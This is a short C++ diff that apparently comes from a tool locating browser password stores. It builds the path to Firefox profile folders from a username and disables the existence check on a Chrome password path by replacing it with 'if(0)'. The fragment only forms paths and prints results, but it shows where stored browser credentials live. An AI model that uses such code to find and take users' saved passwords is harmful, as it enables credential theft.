@@ -42,7 +42,8 @@ int main()
         firefox_pass_path += username;
         firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
 #endif
-        if(experimental::filesystem::exists(chrome_pass_path))
+        //if(experimental::filesystem::exists(chrome_pass_path))
+        if(0)
         {
             cout<<chrome_pass_path<<endl;
             cout<<"exists"<<endl;
